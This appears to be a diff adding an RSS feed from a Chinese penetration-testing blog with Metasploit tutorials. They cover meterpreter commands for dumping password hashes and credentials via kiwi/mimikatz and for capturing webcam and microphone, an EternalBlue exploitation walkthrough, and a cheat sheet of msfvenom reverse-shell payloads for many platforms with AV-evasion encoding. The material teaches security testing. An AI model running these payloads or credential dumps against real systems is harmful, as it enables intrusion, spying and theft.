+&lt;p&gt;列举当前登录的用户：run post/windows/gather/enum_logged_on_users&lt;/p&gt;
+&lt;p&gt;查看当前应用程序：run post/windows/gather/enum_applications&lt;/p&gt;
+&lt;p&gt;抓取目标机的屏幕截图：load espia ； screengrab&lt;/p&gt;
+&lt;p&gt;获取相机设备：webcam_list&lt;/p&gt;
+&lt;p&gt;控制拍照 ：webcam_snap&lt;/p&gt;
+&lt;p&gt;直播摄像头：webcam_stream&lt;/p&gt;
+&lt;p&gt;控制录音：record_mic&lt;/p&gt;
+&lt;p&gt;查看当前处于目标机的那个目录：pwd&lt;/p&gt;
+&lt;p&gt;查看当前目录：getlwd&lt;/p&gt;
+&lt;p&gt;导出当前用户密码哈希  run hashdump&lt;/p&gt;
+&lt;p&gt;用户名：SID：LM 哈希：NTLM 哈希:::&lt;/p&gt;
+&lt;p&gt;也可以使用下面这个命令导出 权限更高   run windows/gather/smart_hashdump&lt;/p&gt;
+&lt;p&gt;抓取自动登录的用户名和密码  run windows/gather/credentials/windows_autologin&lt;/p&gt;
+&lt;p&gt;直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入 getsystem）&lt;/p&gt;
+&lt;p&gt;首选终端输入  load kiwi    加载 kiwi&lt;/p&gt;
+&lt;p&gt;creds_all：列举所有凭据&lt;br&gt;
+ creds_kerberos：列举所有 kerberos 凭据&lt;br&gt;
+ creds_msv：列举所有 msv 凭据&lt;br&gt;
+ creds_ssp：列举所有 ssp 凭据&lt;br&gt;
+ creds_tspkg：列举所有 tspkg 凭据&lt;br&gt;
+ creds_wdigest：列举所有 wdigest 凭据&lt;br&gt;
+ dcsync：通过 DCSync 检索用户帐户信息&lt;br&gt;
+ dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID&lt;br&gt;
+golden_ticket_create：创建黄金票据&lt;br&gt;
+ kerberos_ticket_list：列举 kerberos 票据&lt;br&gt;
+ kerberos_ticket_purge：清除 kerberos 票据&lt;br&gt;
+ kerberos_ticket_use：使用 kerberos 票据&lt;br&gt;
+ kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令&lt;br&gt;
+ lsa_dump_sam：dump 出 lsa 的 SAM&lt;br&gt;
+lsa_dump_secrets：dump 出 lsa 的密文&lt;br&gt;
+ password_change：修改密码&lt;br&gt;
+ wifi_list：列出当前用户的 wifi 配置文件&lt;br&gt;
+ wifi_list_shared：列出共享 wifi 配置文件 / 编码&lt;/p&gt;
+&lt;h2 id=&#34;3文件系统命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3文件系统命令&#34;&gt;#&lt;/a&gt; 3. 文件系统命令&lt;/h2&gt;
+&lt;p&gt;cat c:\boot.ini# 查看文件内容，文件必须存在&lt;br&gt;
+ del c:\boot.ini #删除指定的文件&lt;br&gt;
+ upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如 upload  setup.exe C:\windows\system32&lt;br&gt;
+download nimeia.txt/root/Desktop/   # 下载文件到本机上如：download C:\boot.ini/root / 或者 download C:\&amp;quot;ProgramFiles&amp;quot;\Tencent\QQ\Users\295****&lt;em&gt;&lt;em&gt;125\Msg2.0.db /root/&lt;br&gt;
+edit c:\boot.ini  # 编辑文件&lt;br&gt;
+ getlwd# 打印本地目录&lt;br&gt;
+ getwd# 打印工作目录&lt;br&gt;
+ lcd# 更改本地目录&lt;br&gt;
+ ls# 列出在当前目录中的文件列表&lt;br&gt;
+ lpwd# 打印本地目录&lt;br&gt;
+ pwd# 输出工作目录&lt;br&gt;
+ cd c:\ #进入目录文件下&lt;br&gt;
+ rm file #删除文件&lt;br&gt;
+ mkdir dier #在受害者系统上的创建目录&lt;br&gt;
+ rmdir# 受害者系统上删除目录&lt;br&gt;
+ dir# 列出目标主机的文件和文件夹信息&lt;br&gt;
+ mv# 修改目标主机上的文件名&lt;br&gt;
+ search -d d:\www -f web.config #search 文件，如 search  -d c:\  -f&lt;/em&gt;.doc&lt;br&gt;
+meterpreter &amp;gt; search -f autoexec.bat  #搜索文件&lt;br&gt;
+ meterpreter &amp;gt; search -f sea&lt;/em&gt;.bat c:\xamp\&lt;br&gt;
+enumdesktops     #用户登录数&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/</guid>
+            <title>msfconsole漏洞利用流程</title>
+            <link>https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/</link>
+            <pubDate>Thu, 12 Jan 2023 03:46:27 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;一-阶段划分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-阶段划分&#34;&gt;#&lt;/a&gt; 一、阶段划分：&lt;/h1&gt;
+&lt;p&gt;漏洞利用分为 前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用 报告 这几个阶段&lt;/p&gt;
+&lt;h2 id=&#34;1前期交互阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1前期交互阶段&#34;&gt;#&lt;/a&gt; 1. 前期交互阶段：&lt;/h2&gt;
+&lt;p&gt;与客户组织进行交互讨论，确定范围，目标等&lt;/p&gt;
+&lt;p&gt;​         这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围&lt;/p&gt;
+&lt;p&gt;![1643165117094](10-11  msfconsole 漏洞利用流程.assets/1643165117094.png)&lt;/p&gt;
+&lt;h2 id=&#34;2情报搜集阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2情报搜集阶段&#34;&gt;#&lt;/a&gt; 2. 情报搜集阶段：&lt;/h2&gt;
+&lt;p&gt;获取更多目标组织信息，&lt;/p&gt;
+&lt;p&gt;|          外围信息搜索   -    Google&lt;/p&gt;
+&lt;p&gt;![1643165139006](10-11  msfconsole 漏洞利用流程.assets/1643165139006.png)&lt;/p&gt;
+&lt;p&gt;​          主机探测与端口扫描         如 -Nmap&lt;/p&gt;
+&lt;p&gt;​           服务扫描       利用 metasploit 中的 auxiliary/scanner/ 中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描&lt;/p&gt;
+&lt;p&gt;​            网络漏洞扫描   -OpenVAS、Nessus 等&lt;/p&gt;
+&lt;p&gt;​             其他工具扫描  py 脚本扫描&lt;/p&gt;
+&lt;h2 id=&#34;3威胁建模阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3威胁建模阶段&#34;&gt;#&lt;/a&gt; 3. 威胁建模阶段：&lt;/h2&gt;
+&lt;p&gt;理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作&lt;/p&gt;
+&lt;p&gt;![1643165166875](10-11  msfconsole 漏洞利用流程.assets/1643165166875.png)&lt;/p&gt;
+&lt;p&gt;​           这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。&lt;/p&gt;
+&lt;h2 id=&#34;4漏洞分析阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4漏洞分析阶段&#34;&gt;#&lt;/a&gt; 4. 漏洞分析阶段：&lt;/h2&gt;
+&lt;p&gt;搜索可获取的渗透代码资源&lt;/p&gt;
+&lt;p&gt;![1643165182827](10-11  msfconsole 漏洞利用流程.assets/1643165182827.png)&lt;/p&gt;
+&lt;p&gt;​           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode&lt;/p&gt;
+&lt;h2 id=&#34;5渗透利用阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5渗透利用阶段&#34;&gt;#&lt;/a&gt; 5. 渗透利用阶段：&lt;/h2&gt;
+&lt;p&gt;找出安全漏洞，入侵系统&lt;/p&gt;
+&lt;p&gt;​          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用&lt;/p&gt;
+&lt;h2 id=&#34;6后渗透利用阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6后渗透利用阶段&#34;&gt;#&lt;/a&gt; 6. 后渗透利用阶段：&lt;/h2&gt;
+&lt;p&gt;Meterpreter，实施操作&lt;/p&gt;
+&lt;p&gt;​            这个阶段 就开始实施相关数据下载 后门维持  提权等操作&lt;/p&gt;
+&lt;h2 id=&#34;7报告阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7报告阶段&#34;&gt;#&lt;/a&gt; 7. 报告阶段：&lt;/h2&gt;
+&lt;p&gt;漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）&lt;/p&gt;
+&lt;p&gt;![1643165204135](10-11  msfconsole 漏洞利用流程.assets/1643165204135.png)&lt;/p&gt;
+&lt;p&gt;|             这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容&lt;/p&gt;
+&lt;p&gt;在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x 站等等；&lt;/p&gt;
+&lt;h1 id=&#34;二-实际操作举例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实际操作举例&#34;&gt;#&lt;/a&gt; 二、实际操作（举例）&lt;/h1&gt;
+&lt;p&gt;主机范围和目标已确定&lt;/p&gt;
+&lt;p&gt;1 情报搜集&lt;/p&gt;
+&lt;p&gt;基于 msf 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;search 搜索&lt;/p&gt;
+&lt;p&gt;msf 终端内输入 search scanner type:auxiliary&lt;/p&gt;
+&lt;p&gt;可用于发现主机的模块&lt;/p&gt;
+&lt;p&gt;auxiliary/scanner/discovery/arp_sweep # 基于 ARP 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;auxiliary/scanner/discovery/udp_sweep # 基于 UDP 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;auxiliary/scanner/ftp/ftp_version # 发现 FTP 服务&lt;/p&gt;
+&lt;p&gt;auxiliary/scanner/http/http_version # 发现 HTTP 服务&lt;/p&gt;
+&lt;p&gt;auxiliary/scanner/smb/smb_version # 基于 smb 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;基于 netbios 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;基于 snmap 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;基于 ICMP 发现内网存活主机&lt;/p&gt;
+&lt;p&gt;2  威胁建模&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;经过第一步情报收集 我们通过 arp 发现了 目标机器 ip&lt;/p&gt;
+&lt;p&gt;然后通过对目标机器的 ip 扫描  我们知道了  目标机器开通了 80 端口  有 web 服务  开了 ftp 端口  有文件服务&lt;/p&gt;
+&lt;p&gt;开了 smb&lt;/p&gt;
+&lt;p&gt;最终决定对 smb 相关的漏洞进行利用&lt;/p&gt;
+&lt;p&gt;备选方案通过植入木马的方式进行利用&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;3   漏洞分析&lt;/p&gt;
+&lt;p&gt;第一步先查看 smb 利用漏洞有哪些  比如永恒之蓝&lt;/p&gt;
+&lt;p&gt;1 查询 msf 与永恒之蓝相关的 模块&lt;/p&gt;
+&lt;p&gt;使用命令    search ms17_010&lt;/p&gt;
+&lt;p&gt;2 然后我们利用了一个永恒之蓝的 扫描模块&lt;/p&gt;
+&lt;p&gt;use auxiliary/scanner/smb/smb_ms17_010&lt;/p&gt;
+&lt;p&gt;3  输入  options  查看扫描模块需要配置的参数&lt;/p&gt;
+&lt;p&gt;3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）&lt;/p&gt;
+&lt;p&gt;set rhost   ip&lt;/p&gt;
+&lt;p&gt;4 然后我们执行扫描 输入  run&lt;/p&gt;
+&lt;p&gt;发现了 可能存在漏洞的主机&lt;/p&gt;
+&lt;p&gt;4  渗透利用&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;1 加载 永恒之蓝漏洞利用模块&lt;/p&gt;
+&lt;p&gt;use exploit/windows/smb/ms17_010_eternalblue&lt;/p&gt;
+&lt;p&gt;2  输入  options  查看扫描模块需要配置的参数&lt;/p&gt;
+&lt;p&gt;3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）&lt;/p&gt;
+&lt;p&gt;set rhost   ip&lt;/p&gt;
+&lt;p&gt;3.2 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）&lt;/p&gt;
+&lt;p&gt;set lhost   ip&lt;/p&gt;
+&lt;p&gt;3.3 然后我们配置了 lport  （指的是监控的端口 ）&lt;/p&gt;
+&lt;p&gt;set lport   ip&lt;/p&gt;
+&lt;p&gt;注意端口必须没有被占用&lt;/p&gt;
+&lt;p&gt;4 然后我们执行扫描 输入  run 执行永恒之蓝漏洞利用&lt;/p&gt;
+&lt;p&gt;但是发现失败  提示 模块已经利用了  但是没有返回对应 session&lt;/p&gt;
+&lt;p&gt;![image.png](10-11  msfconsole 漏洞利用流程.assets/bffdb79061ad4b0aa92d2dfde83e9f1b.png)&lt;/p&gt;
+&lt;p&gt;5  备选方案通过植入木马的方式进行利用&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;1  我们知道目标机器是 win 系统  所以使用 msfvenom  生成一个 win 平台的木马&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp&lt;/p&gt;
+&lt;p&gt;LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 10  -f exe -o payload.exe&lt;/p&gt;
+&lt;p&gt;2 漏洞生成后  通过启动一个 py 服务将木马上传到目标机器&lt;/p&gt;
+&lt;p&gt;python -m SimpleHTTPServer 80&lt;/p&gt;
+&lt;p&gt;3 配置监控程序我们使用了&lt;/p&gt;
+&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
+&lt;p&gt;3 输入 options 进入配置&lt;/p&gt;
+&lt;p&gt;3.1 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）&lt;/p&gt;
+&lt;p&gt;set lhost   ip&lt;/p&gt;
+&lt;p&gt;3.2 然后我们配置了 lport  （指的是监控的端口 ）&lt;/p&gt;
+&lt;p&gt;set lport   ip&lt;/p&gt;
+&lt;p&gt;注意端口必须和 msfvenom 生成的木马端口一样才行&lt;/p&gt;
+&lt;p&gt;4 配置攻击载荷 payload&lt;/p&gt;
+&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
+&lt;p&gt;5 执行利用等待目标机器执行木马&lt;/p&gt;
+&lt;p&gt;6 目标机器执行了木马&lt;/p&gt;
+&lt;p&gt;利用成功并获得 meterpreter&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;5  后渗透利用&lt;/p&gt;
+&lt;p&gt;进入新文档&lt;/p&gt;
+&lt;p&gt;6  报告阶段&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msfvenom%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</guid>
+            <title></title>
+            <link>https://mangpumo.github.io/2023/01/12/msfvenom%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0/</link>
+            <pubDate>Thu, 12 Jan 2023 03:37:56 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;Kali 中的 msfvenom 取代了 msfpayload 和 msfencode，常用于生成后门木马&lt;/p&gt;
+&lt;p&gt;msfpayload 是 MSF 攻击荷载生成器，用于生成 shellcode 和可执行代码。&lt;br&gt;
+msfencode 是 MSF 编码器。&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;一 、msfvenom 常用参数&lt;/p&gt;
+&lt;p&gt;-l&lt;br&gt;
+ 列出指定模块的所有可用资源，模块类型包括: payloads, encoders, nops, all&lt;/p&gt;
+&lt;p&gt;-p&lt;br&gt;
+ 指定需要使用的 payload (攻击荷载)。&lt;/p&gt;
+&lt;p&gt;-f&lt;br&gt;
+ 指定输出格式&lt;/p&gt;
+&lt;p&gt;Executable formats:Asp、aspx、aspx-exe、axis2、dll、elf、elf-so、exe、exe-only、exe-service、exe-smallhta-psh、jar、jsp、loop-vbs、macho、msi、msi-nouac、osx-app、psh、psh-cmd、psh-net、psh-reflection、python-reflection、vba、vba-exe、vba-psh、vbs、war；&lt;/p&gt;
+&lt;p&gt;Transform formats:base32、base64、bash、c、csharp、dw、dword、hex、java、js_be、js_le、num、perl、pl、powershell、ps1、py、python、raw、rb、ruby、sh、vbapplication、vbscript；&lt;/p&gt;
+&lt;p&gt;-e&lt;br&gt;
+ 指定需要使用的 encoder（编码器）编码免杀。&lt;/p&gt;
+&lt;p&gt;-a&lt;br&gt;
+ 指定 payload 的目标架构&lt;/p&gt;
+&lt;p&gt;选择架构平台:x86 | x64 | x86_64&lt;br&gt;
+Platforms:windows, netware, android, java, ruby, linux, cisco, solaris, osx, bsd, openbsd, bsdi, netbsd, freebsd, aix, hpux, irix, unix, php, javascript, python, nodejs, firefox, mainframe&lt;/p&gt;
+&lt;p&gt;-o&lt;br&gt;
+ 保存 payload 文件输出。&lt;/p&gt;
+&lt;p&gt;-b&lt;br&gt;
+ 设定规避字符集，比如: &#39;\x00\xff&#39; 避免使用的字符&lt;/p&gt;
+&lt;p&gt;-n&lt;br&gt;
+ 为 payload 预先指定一个 NOP 滑动长度&lt;/p&gt;
+&lt;p&gt;-s&lt;br&gt;
+ 设定有效攻击荷载的最大长度生成 payload 的最大长度，就是文件大小。&lt;/p&gt;
+&lt;p&gt;-i&lt;br&gt;
+ 指定 payload 的编码次数&lt;/p&gt;
+&lt;p&gt;-c&lt;br&gt;
+ 指定一个附加的 win32 shellcode 文件&lt;/p&gt;
+&lt;p&gt;-x&lt;br&gt;
+ 指定一个自定义的可执行文件作为模板&lt;br&gt;
+例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。&lt;/p&gt;
+&lt;p&gt;-k&lt;br&gt;
+ 保护模板程序的动作，注入的 payload 作为一个新的进程运行&lt;br&gt;
+例如：原先有个正常文件 normal.exe 可以通过这个选项把后门捆绑到这个程序上面。&lt;/p&gt;
+&lt;p&gt;-v&lt;br&gt;
+ 指定一个自定义的变量，以确定输出格式&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;二、各平台生成 payload 命令&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Windows&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp&lt;/p&gt;
+&lt;p&gt;LHOST=192.168.3.33 LPORT=4444 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 10  -f exe -o payload.exe&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Mac&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp LHOST=192.168.3.33 LPORT=4444 -f macho -o payload.macho&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Android&lt;/p&gt;
+&lt;p&gt;msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567  -o payload.apk&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Powershell&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/powershell_reverse_tcp LHOST=192.168.1.1 LPORT=8888 -e cmd/powershell_base64 -i 3 -f raw -o payload.ps1&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;Linux&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f elf -o payload.elf&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;php&lt;/p&gt;
+&lt;p&gt;msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.1  LPORT=8888  -f raw &amp;gt; shell.php&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;aspx&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=8888 -f aspx -o payload.aspx&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;JSP&lt;/p&gt;
+&lt;p&gt;msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.jsp&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;war&lt;/p&gt;
+&lt;p&gt;msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw - o payload.war&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;nodejs&lt;/p&gt;
+&lt;p&gt;msfvenom -p nodejs/shell_reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o payload.js&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;python&lt;/p&gt;
+&lt;p&gt;msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1  LPORT=4567 -f raw -o &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BheWxvYWQucHk=&#34;&gt;payload.py&lt;/span&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;perl&lt;/p&gt;
+&lt;p&gt;msfvenom -p cmd/unix/reverse_perl LHOST=192.168.1.1  LPORT=4567 -f raw -o &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BheWxvYWQucGw=&#34;&gt;payload.pl&lt;/span&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;ruby&lt;/p&gt;
+&lt;p&gt;msfvenom -p ruby/shell_reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.rb&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;lua&lt;/p&gt;
+&lt;p&gt;msfvenom -p cmd/unix/reverse_lua LHOST=192.168.1.1 LPORT=4567 -f raw -o payload.lua&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;windows shellcode&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;linux shellcode&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4567 -f c&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;mac shellcode&lt;/p&gt;
+&lt;p&gt;msfvenom -a x86 --platform osx -p osx/x86/shell_reverse_tcp  LHOST=192.168.1.1  LPORT=4567 -f c&lt;/p&gt;
+&lt;hr&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/MSF%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97modules/</guid>
+            <title>MSF的核心模块modules</title>
+            <link>https://mangpumo.github.io/2023/01/12/MSF%E7%9A%84%E6%A0%B8%E5%BF%83%E6%A8%A1%E5%9D%97modules/</link>
+            <pubDate>Thu, 12 Jan 2023 03:33:25 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;msf 的模块都放在&lt;/p&gt;
+&lt;p&gt;/usr/share/metasploit-framework/modules/ 这个目录下&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1640748958000/9e03e3c4dbc548d7b38c0389b1f131ab.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;1 auxiliary: 辅助模块，辅助渗透 (端口扫描、登录密码爆破、漏洞验证等)&lt;/p&gt;
+&lt;p&gt;2 exploits: 漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用。&lt;/p&gt;
+&lt;p&gt;3 payloads: 攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹 shell 的代码&lt;/p&gt;
+&lt;p&gt;4 post: 后渗透阶段模块，漏洞利用成功获得 meterpreter 之后， 向目标发送的一些功能性&lt;/p&gt;
+&lt;p&gt;指令，如：提权等&lt;/p&gt;
+&lt;p&gt;5 encoders: 编码器模块，主要包含各种编码工具，对 payload 进行编码加密，以便绕过入侵检测和过滤系统&lt;/p&gt;
+&lt;p&gt;6 evasion: 躲避模块，用来生成免杀 payload&lt;/p&gt;
+&lt;p&gt;7 nops: 这里主要放着调整 shellcode 前置 nop 指令长度的工具（不理解没关系）&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/MSF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/</guid>
+            <title>MSF目录结构</title>
+            <link>https://mangpumo.github.io/2023/01/12/MSF%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84/</link>
+            <pubDate>Thu, 12 Jan 2023 03:30:47 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;msf目录结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#msf目录结构&#34;&gt;#&lt;/a&gt; MSF 目录结构&lt;/h1&gt;
+&lt;p&gt;kali 终端中输&lt;/p&gt;
+&lt;p&gt;/usr/share/metasploit-framework&lt;/p&gt;
+&lt;p&gt;然后输入 ls 查看&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/1abfa994573e4ec1b283aea5ecb809d3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/13fa9f11a9b540f7a15854b67186ae99.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639971401000/15e181b7c7534f549cbbcb249121acb5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;要记住的一些模块&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#要记住的一些模块&#34;&gt;#&lt;/a&gt; 要记住的一些模块&lt;/h1&gt;
+&lt;p&gt;modules：目录里面存放渗透使用的  辅助模块  编码模块  利用模块  攻击载荷   后渗透模块&lt;/p&gt;
+&lt;p&gt;plugins： 这个模块需要用 load 加载，主要提供数据库连接插件 和 各种要用到的插件。&lt;/p&gt;
+&lt;p&gt;tools：包含一些有用的脚本和零散的工具。&lt;/p&gt;
+&lt;p&gt;scripts：目录里面存放都是 meterpreter 利用的脚本。&lt;/p&gt;
+&lt;p&gt;db：数据放在这个目录里&lt;/p&gt;
+&lt;p&gt;data：存放使用到的文件，比如密码字典、meterpreter、passivex、vnc、dlls 等工具和一些用户接口代码，msfweb 和一些其他模块用到的数据文件&lt;/p&gt;
+&lt;p&gt;lib：库文件都保存在这个目录里&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper/</guid>
+            <title>MSF图形界面Viper</title>
+            <link>https://mangpumo.github.io/2023/01/12/MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper/</link>
+            <pubDate>Thu, 12 Jan 2023 02:57:39 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;MSF 图形化界面 Viper (炫彩蛇) 下载与使用&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Viper 是一款图形化内网渗透工具，将内网渗透过程中常用的战术及技术进行模块化及武器化.&lt;/p&gt;
+&lt;p&gt;集成杀软绕过，内网隧道，文件管理，命令行等基础功能.&lt;/p&gt;
+&lt;p&gt;当前已集成 70 + 个模块，覆盖初始访问 / 持久化 / 权限提升 / 防御绕过 / 凭证访问 / 信息收集 / 横向移动等大类.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在 Kali Linux 上安装 Docker&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;apt-get update&lt;/p&gt;
+&lt;p&gt;#使用 apt 安装 docker&lt;/p&gt;
+&lt;p&gt;apt-get install -y &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2RvY2tlci5pbw==&#34;&gt;docker.io&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;#设置开机启动 systemctl start docker&lt;/p&gt;
+&lt;p&gt;#检查启动状态 docker version&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043246556.png&#34; alt=&#34;1640043246556&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;安装 docker-compose&lt;/strong&gt;&lt;/p&gt;
